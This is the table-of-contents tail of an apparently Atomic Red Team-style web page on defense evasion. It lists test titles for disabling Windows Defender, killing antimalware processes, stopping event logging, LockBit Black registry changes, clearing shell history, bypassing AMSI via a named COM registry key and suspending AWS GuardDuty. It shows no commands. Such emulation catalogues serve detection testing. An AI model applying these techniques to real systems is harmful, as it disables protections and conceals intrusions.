<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-27-disable-windows-defender-with-dismthe-following-atomic-will-attempt-to-disable-windows-defender-using-the-built-in-dism-exe-deployment-image-servicing-and-management-tool">Atomic Test #27 - Disable Windows Defender with DISMThe following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-28-disable-defender-using-nirsoft-advancedrun">Atomic Test #28 - Disable Defender Using NirSoft AdvancedRun</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id42">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-advancedrun-exe-must-exist-at-advancedrun-location">Description: Advancedrun.exe must exist at #{AdvancedRun_Location}</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id43">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id44">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id45">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id46">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-29-kill-antimalware-protected-processes-using-backstab">Atomic Test #29 - Kill antimalware protected processes using Backstab</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id47">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-backstab64-exe-should-exist-in-extrnalpayloads-directory">Description: Backstab64.exe should exist in ExtrnalPayloads Directory</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id48">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id49">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id50">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-30-winpwn-kill-the-event-log-services-for-stealthkill-the-event-log-services-for-stealth-via-function-of-winpwnsupported-platforms-windows-attack-commands-run-with-powershell">Atomic Test #30 - WinPwn - Kill the event log services for stealthKill the event log services for stealth via function of WinPwn<strong>Supported Platforms:</strong> windows#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-31-tamper-with-windows-defender-atp-using-aliases-powershellattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-using-set-mppreference-aliases-upon-execution-virus-and-threat-protection-will-show-as-disabled">Atomic Test #31 - Tamper with Windows Defender ATP using Aliases - PowerShellAttempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id51">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-32-lockbit-black-disable-privacy-settings-experience-using-registry-cmdlockbit-black-disable-privacy-settings-experience-using-registry">Atomic Test #32 - LockBit Black - Disable Privacy Settings Experience Using Registry -cmdLockBit Black - Disable Privacy Settings Experience Using Registry</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id52">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-33-lockbit-black-use-registry-editor-to-turn-on-automatic-logon-cmdlockbit-black-use-registry-editor-to-turn-on-automatic-logon">Atomic Test #33 - LockBit Black - Use Registry Editor to turn on automatic logon -cmdLockBit Black - Use Registry Editor to turn on automatic logon</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id53">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-34-lockbit-black-disable-privacy-settings-experience-using-registry-powershelllockbit-black-disable-privacy-settings-experience-using-registry">Atomic Test #34 - LockBit Black - Disable Privacy Settings Experience Using Registry -PowershellLockBit Black - Disable Privacy Settings Experience Using Registry</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id54">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-35-lockbit-black-use-registry-editor-to-turn-on-automatic-logon-powershelllockbit-black-use-registry-editor-to-turn-on-automatic-logon">Atomic Test #35 - Lockbit Black - Use Registry Editor to turn on automatic logon -PowershellLockbit Black - Use Registry Editor to turn on automatic logon</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id55">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-36-disable-windows-defender-with-pwsh-disable-windowsoptionalfeaturethe-following-atomic-will-attempt-to-disable-windows-defender-using-the-built-in-powershell-cmdlet-disable-windowsoptionalfeature-deployment-image-servicing-and-management-tool">Atomic Test #36 - Disable Windows Defender with PwSh Disable-WindowsOptionalFeatureThe following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-37-wmic-tamper-with-windows-defender-evade-scanning-folderthe-following-atomic-will-attempt-to-exclude-a-folder-within-defender-leveraging-wmi">Atomic Test #37 - WMIC Tamper with Windows Defender Evade Scanning FolderThe following Atomic will attempt to exclude a folder within Defender leveraging WMI</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id56">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-38-delete-windows-defender-scheduled-tasks">Atomic Test #38 - Delete Windows Defender Scheduled Tasks</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dependencies-run-with-command-prompt">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-the-windows-defender-scheduled-tasks-must-be-backed-up-first">Description: The Windows Defender scheduled tasks must be backed up first</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id57">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id58">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id59">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id60">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-39-clear-historyclear-shell-history-this-technique-only-affect-the-bash-shell-application">Atomic Test #39 - Clear HistoryClear Shell History. This technique only affect the bash shell application.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-40-suspend-historysuspend-shell-history-seen-in-awfulshred-wiper-https-unix-stackexchange-com-questions-10922-temporarily-suspend-bash-history-on-a-given-shell">Atomic Test #40 - Suspend Historysuspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id61">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-41-reboot-linux-host-via-kernel-system-requestreboot-system-via-system-request-seen-in-awfulshred-wiper">Atomic Test #41 - Reboot Linux Host via Kernel System Requestreboot system via system request seen in Awfulshred wiper.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-42-clear-pagging-cacheclear-pagging-cache-via-system-request-this-is-a-temporary-change-in-the-system-to-clear-paging-cache-this-technique-seen-in-awfulshred-wiper-as-part">Atomic Test #42 - Clear Pagging Cacheclear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-43-disable-memory-swapdisable-swapping-of-device-paging-that-impaire-the-compromised-host-to-swap-data-if-the-ram-is-full-awfulshred-wiper-used-this-technique-as-an-additional">Atomic Test #43 - Disable Memory Swapdisable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id62">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-44-disable-hypervisor-enforced-code-integrity-hvci">Atomic Test #44 - Disable Hypervisor-Enforced Code Integrity (HVCI)</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id63">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-hvci-must-be-enabled">Description: HVCI must be enabled</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id64">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id65">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id66">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id67">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-45-amsi-bypass-override-amsi-via-comwith-administrative-rights-an-adversary-can-disable-amsi-via-registry-value-in-hkcu-software-classes-clsid-fdb00e52-a214-4aa1-8fba-4357bb0072ec-by-overriding-the-microsoft-defender-com-object-for-amsi-and-points-it-to-a-dll-that-does-not-exist">Atomic Test #45 - AMSI Bypass - Override AMSI via COMWith administrative rights, an adversary can disable AMSI via registry value in HKCU\Software\Classes\CLSID{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id68">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-46-aws-guardduty-suspension-or-deletion">Atomic Test #46 - AWS - GuardDuty Suspension or Deletion</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dependencies-run-with-bash">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-check-if-aws-credentials-file-has-a-default-stanza-is-configured">Description: Check if ~/.aws/credentials file has a default stanza is configured</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id69">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id70">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-commands-run-with-bash">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id71">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-47-tamper-with-defender-atp-on-linux-macoswith-root-privileges-an-adversary-can-disable-real-time-protection-note-this-test-assumes-defender-is-not-in-passive-mode-and-real-time-protection-is-enabled-the-use-of-a-managed-json-on-linux-or-defender-plist-on-macos-will-prevent-these-changes-tamper-protection-will-also-prevent-this-available-on-macos-but-not-linux-at-the-time-of-writing-installation-of-mdatp-is-a-prerequisite-installation-steps-vary-across-macos-and-linux-distros-see-microsoft-public-documentation-for-instructions-https-learn-microsoft-com-en-us-microsoft-365-security-defender-endpoint-mac-install-manually-view-o365-worldwide-https-learn-microsoft-com-en-us-microsoft-365-security-defender-endpoint-linux-install-manually-view-o365-worldwide">Atomic Test #47 - Tamper with Defender ATP on Linux/MacOSWith root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id72">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-48-tamper-with-windows-defender-registry-reg-exedisable-windows-defender-by-tampering-with-windows-defender-registry-using-the-utility-reg-exe">Atomic Test #48 - Tamper with Windows Defender Registry - Reg.exeDisable Windows Defender by tampering with windows defender registry using the utility “reg.exe”</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id73">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-49-tamper-with-windows-defender-registry-powershelldisable-windows-defender-by-tampering-with-windows-defender-registry-through-powershell">Atomic Test #49 - Tamper with Windows Defender Registry - PowershellDisable Windows Defender by tampering with windows defender registry through powershell</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id74">Cleanup:</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#detection">Detection</a></li>
</ul>
  </nav></div>

</div></div>
              
            
          </div>
          <footer class="bd-footer-content">
            
<div class="bd-footer-content__inner container">
  
  <div class="footer-item">
    
<p class="component-author">
By The Jupyter Book community
</p>

  </div>
  
  <div class="footer-item">
    

  <p class="copyright">
    
      © Copyright 2022.
      <br/>
    
  </p>

  </div>
  
  <div class="footer-item">
    
  </div>
  
  <div class="footer-item">
    
  </div>
  
</div>
          </footer>
        

      </main>
    </div>
  </div>
  
  <!-- Scripts loaded after <body> so the DOM is not blocked -->
  <script src="../../_static/scripts/bootstrap.js?digest=bd9e20870c6007c4c509"></script>
<script src="../../_static/scripts/pydata-sphinx-theme.js?digest=bd9e20870c6007c4c509"></script>

  <footer class="bd-footer">
  </footer>
  </body>
</html>